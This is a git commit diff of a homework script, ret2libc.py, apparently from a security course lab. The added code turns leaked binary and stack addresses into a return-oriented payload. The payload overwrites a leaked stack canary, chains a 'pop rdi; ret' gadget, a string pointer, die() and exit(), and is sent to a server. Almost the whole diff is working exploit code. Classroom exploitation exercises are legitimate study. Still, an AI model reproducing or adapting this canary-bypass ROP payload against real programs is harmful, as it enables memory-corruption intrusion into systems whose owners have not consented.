19818c2616597ee2f29c43bd5641c5eb32d0b6e3
Devharsh Trivedi <devharsh@live.in>
2020-12-03 14:20:18 -0500

    Task2 works outside GDB

--- HW3/assignment_files/hw3/ret2libc.py
+++ HW3/assignment_files/hw3/ret2libc.py
@@ -37,11 +37,6 @@ for i in range(len(data)):
 		#print(valuebyte)
 		#valuebyte = ''
 
-# get binary base address (entry location)
-#os.system('readelf -a victim | grep -i "entry" > tmp')
-#binadd = open('tmp', 'r').read()
-#binadd = binadd.split(':')
-
 canary.reverse()
 canary_str = ''
 for c in range(8):
@@ -64,13 +59,39 @@ with open(filename, 'w') as file_object:
     file_object.write(write_to_file)
 
 # add offset to base address and conver to little endian
+
 b_num = bin_addr_str.replace('0x','').encode()
+b_die = bin_addr_str.replace('0x','').encode()
+b_pwn = ret_addr_str.replace('0x','').encode()
+
+# for pop rdi; ret
 b_num = hex(int(b_num,16) + int('0xf33',16))
+
+# for die()
+b_die = hex(int(b_die,16) + int('0xaea',16))
+
+# for string
+b_pwn = hex(int(b_pwn,16) - int('0x3a0',16))
+
 bnum2 = ''
+bdie2 = ''
+bpwn2 = ''
+
 if len(b_num) < 18:
 	for i in range(18-len(b_num)):
 		bnum2+='0'
 bnum2+=b_num.replace('0x','')
+
+if len(b_die) < 18:
+        for i in range(18-len(b_die)):
+                bdie2+='0'
+bdie2+=b_die.replace('0x','')
+
+if len(b_pwn) < 18:
+        for i in range(18-len(b_pwn)):
+                bpwn2+='0'
+bpwn2+=b_pwn.replace('0x','')
+
 bin_addr = []
 this_byte = ''
 for i in range(16):
@@ -83,20 +104,42 @@ b_address = []
 for i in range(8):
 	b_address.append(bin_addr[i])
 
+die_addr = []
+this_byte = ''
+for i in range(16):
+        this_byte += bdie2[i]
+        if (i+1)%2 == 0:
+                die_addr.append(int(this_byte,16))
+                this_byte=''
+die_addr.reverse()
+d_address = []
+for i in range(8):
+        d_address.append(die_addr[i])
+
+pwn_addr = []
+this_byte = ''
+for i in range(16):
+        this_byte += bpwn2[i]
+        if (i+1)%2 == 0:
+                pwn_addr.append(int(this_byte,16))
+                this_byte=''
+pwn_addr.reverse()
+pwn_address = []
+for i in range(8):
+        pwn_address.append(pwn_addr[i])
+
 strg = b'pawned!\0' # pawned!
 strg+= b'AAAAAAAA'  # AAAAAAAA
 strg+= b'BBBBBBBB'  # BBBBBBBB
-# canary
 for c in range(8):
-        strg += struct.pack('B',b_canary[c])
+        strg += struct.pack('B',b_canary[c]) # canary
 strg+= b'\xde\xad\xbe\xef\x00\x00\x00\x00' # deadbeef
 for c in range(8):
         strg += struct.pack('B',b_address[c]) # pop rdi; ret
-#strg+= b'\x33\x4f\x55\x55\x55\x55\x00\x00' # binary base + 0xf33 -- pop rdi; ret
-strg+= b'\xca\xb4\xb9\xf7\xff\x7f\x00\x00' # HOME
-#strg+= b'\x40\xe5\xff\xff\xff\x7f\x00\x00' # string address
-#strg+= b'\xc0\xe4\xff\xff\xff\x7f\x00\x00' # string address
-strg+= b'\xea\x4a\x55\x55\x55\x55\x00\x00' # die()
+for c in range(8):
+        strg += struct.pack('B',pwn_address[c]) # string - pawned!
+for c in range(8):
+        strg += struct.pack('B',d_address[c]) # die()
 strg+= b'\x40\x70\xa4\xf7\xff\x7f\x00\x00' # exit()
 
 #send string and length to server
